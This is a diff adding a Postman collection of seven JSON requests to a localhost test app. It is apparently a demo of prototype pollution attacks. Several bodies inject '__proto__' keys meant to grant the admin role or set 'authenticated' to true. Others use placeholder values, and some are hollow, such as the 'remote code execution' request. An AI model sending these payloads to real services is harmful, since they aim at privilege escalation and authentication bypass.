@@ -1,0 +1,170 @@
+{
+  "info": {
+    "_postman_id": "abc12345-6789-0123-4567-890abcdef123",
+    "name": "Prototype Pollution APIs",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "Privilege Escalation",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"id\": 1,\n  \"name\": \"Alice\",\n  \"role\": \"user\",\n  \"__proto__\": {\n    \"role\": \"admin\"\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/privilegeEscalation",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["privilegeEscalation"]
+        }
+      }
+    },
+    {
+      "name": "Denial of Service",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"largePayload\": {\n    \"a\": {\n      \"b\": {}\n    }\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/denialOfService",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["denialOfService"]
+        }
+      }
+    },
+    {
+      "name": "Data Corruption",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"key\": \"importantData\",\n  \"__proto__\": {\n    \"overwrite\": \"maliciousValue\"\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/dataCorruption",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["dataCorruption"]
+        }
+      }
+    },
+    {
+      "name": "Remote Code Execution",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"code\": \"console.log(\\\"Exploited\\\");\",\n  \"__proto__\": {\n    \"execute\": \"maliciousCode\"\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/remoteCodeExecution",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["remoteCodeExecution"]
+        }
+      }
+    },
+    {
+      "name": "Inconsistent Behavior",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"input\": \"normalValue\",\n  \"__proto__\": {\n    \"unexpected\": \"behavior\"\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/inconsistentBehavior",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["inconsistentBehavior"]
+        }
+      }
+    },
+    {
+      "name": "Bypass Security Controls",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"auth\": \"none\",\n  \"__proto__\": {\n    \"authenticated\": true\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/bypassSecurity",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["bypassSecurity"]
+        }
+      }
+    },
+    {
+      "name": "Third-Party Vulnerabilities",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"dependency\": \"vulnerable\",\n  \"__proto__\": {\n    \"exploit\": \"attack\"\n  }\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/thirdPartyVulnerabilities",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["thirdPartyVulnerabilities"]
+        }
+      }
+    }
+  ]
+}
